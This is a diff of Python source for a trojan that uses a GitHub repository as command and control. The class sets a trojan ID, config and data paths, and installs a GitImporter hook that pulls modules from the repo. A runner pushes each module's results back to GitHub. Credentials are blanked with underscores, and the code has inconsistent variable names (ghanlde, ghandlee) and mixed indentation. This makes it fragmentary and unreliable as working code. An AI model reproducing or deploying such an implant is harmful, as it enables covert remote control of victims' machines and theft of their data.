@@ -26,20 +26,20 @@ class HubHandler:
           loading configs
     """
 
-    def __init__(self, username, password):
+    def __init__(self):
         self.trojan_id = "abc"
-        self.username = username
-	
+        
         self.trojan_config = "config/%s.json" % self.trojan_id
         self.data_path = "data/%s/" % self.trojan_id
         self.trojan_modules = []
         self.configured = False
 
-        self.ghandle, self.repo, self.branch = self.connect(self.username, password)
+        self.ghandle, self.repo, self.branch = self.connect()
 
-    def connect(self, p):
+    def connect(self):
         " Connect to github and get the repository "
-        gh = login(username=self.username, password=p)
+        gh = _____.______________(login)
+	self.username = gh.me().login
         repo = gh.repository(self.username,"codename-seniorita")
         branch = repo.branch("master")
         return gh, repo, branch
@@ -98,7 +98,7 @@ def module_runner(module, ghanlde, queue=task_queue):
     ghandle.store_module_result(result)
 
 
-ghanlde = HubHandler("hero24", _____.______________) 
+ghanlde = HubHandler() 
 sys.meta_path = [GitImporter(ghandlee)]
 
 while True:
